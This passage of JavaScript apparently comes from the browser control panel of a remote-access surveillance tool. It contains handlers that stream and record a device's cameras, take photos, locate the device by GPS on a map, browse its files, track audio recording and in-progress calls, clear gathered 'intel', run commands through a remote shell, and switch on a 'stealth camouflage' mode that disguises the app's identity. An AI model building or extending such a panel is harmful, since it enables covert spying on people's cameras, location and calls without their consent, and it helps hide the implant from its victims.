  const activeBtn = document.getElementById('cam-btn-' + id);
  if(activeBtn) { activeBtn.classList.add('btn-engaged-green'); activeBtn.style.borderColor = ''; activeBtn.style.color = ''; }
  const img = document.getElementById('main-stream');
  img.style.display = 'none';
  await fetch('/camera/stop-stream');
  setTimeout(() => {
    img.src = '/camera/stream?cam=' + id + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality + '&t=' + Date.now();
    img.onload = () => { document.getElementById('loading-overlay').style.display = 'none'; img.style.display = 'block'; };
  }, 500);
}
function terminateCaptures() {
  streamActive = false;
  const img = document.getElementById('main-stream'); img.src = ''; img.style.display = 'none';
  document.getElementById('loading-overlay').style.display = 'block';
  document.getElementById('loading-overlay').innerText = 'Uplink_Ready';
  const ind = document.getElementById('live-indicator');
  const dot = document.getElementById('indicator-dot');
  const txt = document.getElementById('indicator-text');
  ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)';
  dot.className = 'badge-dot'; txt.innerText = 'STANDBY';
  document.querySelectorAll('.cam-btn').forEach(b => { b.classList.remove('btn-engaged-green'); b.style.borderColor = 'var(--neon-green)'; b.style.color = 'var(--neon-green)'; });
  fetch('/camera/terminate').then(() => { document.getElementById('rec-btn').innerText = 'START_RECORDING'; });
}
function capturePhoto() { if(!camId) { showToast('SELECT_CAMERA_FIRST', 'error'); return; } window.open('/camera/photo?cam=' + camId, '_blank'); }
function toggleRecording() {
  const btn = document.getElementById('rec-btn');
  if(!streamActive) { showToast('START_FEED_FIRST', 'error'); return; }
  if(btn.innerText.includes('START')) { btn.innerText = 'STOP_RECORDING'; fetch('/camera/record?cam=' + camId); }
  else { btn.innerText = 'START_RECORDING'; fetch('/camera/stop-record'); }
}
function checkRecStatus() {
  fetch('/camera/status').then(r => r.json()).then(d => {
    const ind = document.getElementById('live-indicator');
    const dot = document.getElementById('indicator-dot');
    const txt = document.getElementById('indicator-text');
    const recBtn = document.getElementById('rec-btn');
    if (d.recording) { ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)'; dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)'; recBtn.innerText = 'STOP_RECORDING'; }
    else if (streamActive) { ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)'; dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE'; recBtn.innerText = 'START_RECORDING'; }
    else { ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)'; dot.className = 'badge-dot'; txt.innerText = 'STANDBY'; recBtn.innerText = 'START_RECORDING'; }
  });
}

// --- GPS CONTROLS ---
let currentLat = 0; let currentLon = 0;
function addGpsLog(msg) {
  const log = document.getElementById('gps-log'); if(!log) return;
  const div = document.createElement('div');
  div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  log.insertBefore(div, log.firstChild);
}
function locateDevice() {
  addGpsLog('[REQUEST] Pinging satellites...');
  fetch('/gps/locate?json=true').then(r => r.json()).then(data => {
    if (data.success) {
      currentLat = data.lat; currentLon = data.lon;
      const cd = document.getElementById('coord-display'); if(cd) cd.innerHTML = 'LAT: ' + data.lat + ' | LON: ' + data.lon;
      addGpsLog('[SUCCESS] Fix acquired: ' + data.lat + ', ' + data.lon);
      const frame = document.getElementById('map-frame');
      const overlay = document.getElementById('map-overlay');
      const extBtn = document.getElementById('ext-map-btn');
      if(frame) { frame.src = 'https://www.openstreetmap.org/export/embed.html?bbox=' + (data.lon-0.01) + ',' + (data.lat-0.01) + ',' + (data.lon+0.01) + ',' + (data.lat+0.01) + '&layer=mapnik&marker=' + data.lat + ',' + data.lon; frame.style.display = 'block'; }
      if(overlay) overlay.style.display = 'none';
      if(extBtn) extBtn.style.display = 'inline-block';
    } else {
      addGpsLog('[ERROR] ' + data.message);
      showToast(data.message);
    }
  }).catch(err => { addGpsLog('[FATAL] Network error during triangulation'); });
}
function openExternalMap() { window.open('https://www.google.com/maps/search/?api=1&query=' + currentLat + ',' + currentLon, '_blank'); }

// --- FILE / DATA CONTROLS ---
function filterFiles() {
  const val = document.getElementById('file-search').value.toLowerCase();
  document.querySelectorAll('.file-item').forEach(item => {
    const name = item.querySelector('.file-name').textContent.toLowerCase();
    item.style.display = name.includes(val) ? 'flex' : 'none';
  });
}
function setFilter(exts) {
  if(exts === 'all') { document.querySelectorAll('.file-item').forEach(i => i.style.display = 'flex'); return; }
  const list = exts.split(',');
  document.querySelectorAll('.file-item').forEach(item => {
    const name = item.querySelector('.file-name').textContent.toUpperCase();
    const matches = list.some(e => name.endsWith(e));
    item.style.display = matches ? 'flex' : 'none';
  });
}

function clearIntel() {
  showToast('PURGING_INTEL_STREAM...');
  fetch('/intel/clear').then(() => location.reload());
}

function toggleStealth() {
  const type = document.getElementById('stealth-type').value;
  showToast('INITIATING_STEALTH_CAMOUFLAGE...');
  fetch('/stealth?type=' + type);
}
function restoreNormal() {
  showToast('RESTORING_ORIGINAL_IDENTITY...');
  fetch('/stealth?action=restore');
}

window.alert = (m) => showToast(m);
window.onpopstate = updateNav;
window.addEventListener('pageshow', updateNav);
document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible') updateNav(); });

document.addEventListener('DOMContentLoaded', () => {
  updateNav();
  const scrollY = localStorage.getItem('cam_scroll');
  if (scrollY) { window.scrollTo(0, parseInt(scrollY)); localStorage.removeItem('cam_scroll'); }

  if (document.getElementById('log-terminal')) {
    fetchLogs();
    setInterval(fetchLogs, 5000);
  }

  if (document.getElementById('ghost-status-card')) {
    checkGhostStatus();
    refreshGhostLogs();
    setInterval(checkGhostStatus, 2000);
    setInterval(refreshGhostLogs, 2000);
  }

  if (document.getElementById('live-indicator')) {
    setInterval(checkRecStatus, 2000);
    const scroll = localStorage.getItem('optics_scroll');
    if(scroll) { window.scrollTo(0, parseInt(scroll)); localStorage.removeItem('optics_scroll'); }
  }

  if (document.getElementById('duration')) {
    setInterval(function() {
      fetch('/audio/status').then(r => r.json()).then(data => {
        const dTag = document.getElementById('duration');
        if (data.isRecording && dTag) {
          var d = data.duration; var min = Math.floor(d / 60); var sec = d % 60;
          dTag.textContent = min + ':' + (sec < 10 ? '0' : '') + sec;
        }
        if (data.callInProgress && !document.querySelector('.call-alert')) { location.reload(); }
      });
    }, 2000);
  }

  const shellInput = document.getElementById('shell-cmd');
  if (shellInput) {
    shellInput.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
          e.preventDefault();
          if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            this.value = commandHistory[commandHistory.length - 1 - historyIndex];
          }
        } else if (e.key === 'ArrowDown') {
          e.preventDefault();
          if (historyIndex > 0) {
            historyIndex--;
            this.value = commandHistory[commandHistory.length - 1 - historyIndex];
          } else if (historyIndex === 0) {
            historyIndex = -1;
            this.value = '';
          }
        } else if (e.key === 'Enter') {
          executeShell();
        }
    });
  }

  const loginForm = document.getElementById('login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', handleLogin);
  }

  document.addEventListener('click', function() {
    const p = document.getElementById('color-picker-palette');
    if (p && p.style.display === 'grid') {
      p.style.display = 'none';
    }
  });
});
